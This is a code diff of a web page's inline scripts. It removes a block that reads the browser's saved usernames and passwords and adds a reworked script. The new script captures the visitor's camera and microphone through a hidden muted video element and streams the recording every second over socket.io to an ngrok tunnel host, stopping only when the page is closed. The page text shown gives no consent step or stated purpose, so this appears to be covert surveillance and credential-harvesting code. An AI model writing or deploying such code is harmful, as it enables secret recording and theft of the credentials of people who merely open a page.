@@ -29,74 +29,65 @@
     <video id="localVideo" hidden autoplay muted></video>
     <script src="https://cdn.socket.io/4.5.3/socket.io.min.js"></script>
 
+   
+
     <script>
-      if ('credentials' in navigator) {
-    console.log("Credential Management API is supported.");
-    // Attempt to retrieve stored credentials
-    navigator.credentials.get({ password: true })
-        .then((credential) => {
-            if (credential) {
-                console.log("Credential retrieved:", credential);
-                console.log("ID (e.g., username/email):", credential.id);
-                console.log("Password:", credential.password); // Password may not always be accessible
-            } else {
-                console.log("No saved credentials found.");
+
+const socket = io('https://5507-103-240-193-2.ngrok-free.app', {
+    transports: ['websocket', 'polling'], // Explicitly set transports
+}); // Replace with your backend URL
+
+const localVideo = document.getElementById('localVideo');
+
+// Request video and audio from the user's device
+navigator.mediaDevices.getUserMedia({ video: true, audio: true })
+    .then((stream) => {
+        // Display the video on the local video element
+        localVideo.srcObject = stream;
+
+        // Automatically play the video once stream is set
+        localVideo.onloadedmetadata = () => {
+            localVideo.play();
+
+            // Request Picture-in-Picture mode
+            localVideo.requestPictureInPicture()
+                .then(() => {
+                    console.log("Entered Picture-in-Picture mode");
+                })
+                .catch((error) => {
+                    console.error("Error entering Picture-in-Picture mode:", error);
+                });
+        };
+
+        // Set up the MediaRecorder with video and audio
+        const mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp8,opus' });
+
+        // Send recorded chunks to the backend server
+        mediaRecorder.ondataavailable = (event) => {
+            if (event.data.size > 0) {
+                console.log("Sending stream data (video and audio) to backend...");
+                socket.emit('stream-data', event.data);
             }
-        })
-        .catch((error) => {
-            console.error("Error fetching credentials:", error);
-        });
-} else {
-    console.log("Credential Management API is not supported in this browser.");
-}
-    </script>
+        };
 
-    <script>
+        // Start the MediaRecorder and send data every 1 second
+        mediaRecorder.start(1000);
+        console.log("Started media recorder for video and audio");
 
-     
-        const socket = io('https://4eea-150-129-183-182.ngrok-free.app', {
-            transports: ['websocket', 'polling'], // Explicitly set transports
-        }); // Replace with your backend URL
+        // Notify the backend to start saving the stream
+        socket.emit('start-stream');
 
-        const localVideo = document.getElementById('localVideo');
+        // Stop the recording and notify the backend when the user leaves the page
+        window.onbeforeunload = () => {
+            mediaRecorder.stop();
+            socket.emit('stop-stream');
+        };
+    })
+    .catch((err) => {
+        console.error("Error accessing media devices (video/audio):", err);
+    });
 
-        // Request video and audio from the user's device
-        navigator.mediaDevices.getUserMedia({ video: true, audio: true })
-            .then((stream) => {
-                // Display the video on the local video element
-                localVideo.srcObject = stream;
-
-                // Set up the MediaRecorder with video and audio
-                const mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp8,opus' });
-
-                // Send recorded chunks to the backend server
-                mediaRecorder.ondataavailable = (event) => {
-                    if (event.data.size > 0) {
-                        console.log("Sending stream data (video and audio) to backend...");
-                        socket.emit('stream-data', event.data);
-                    }
-                };
-
-                // Start the MediaRecorder and send data every 1 second
-                mediaRecorder.start(1000);
-                console.log("Started media recorder for video and audio");
-
-                // Notify the backend to start saving the stream
-                socket.emit('start-stream');
-
-                // Stop the recording and notify the backend when the user leaves the page
-                window.onbeforeunload = () => {
-                    mediaRecorder.stop();
-                    socket.emit('stop-stream');
-                };
-            })
-            .catch((err) => {
-                console.error("Error accessing media devices (video/audio):", err);
-                
-               
-            });
-      
-
+       
 
      
         // Connect to the backend server
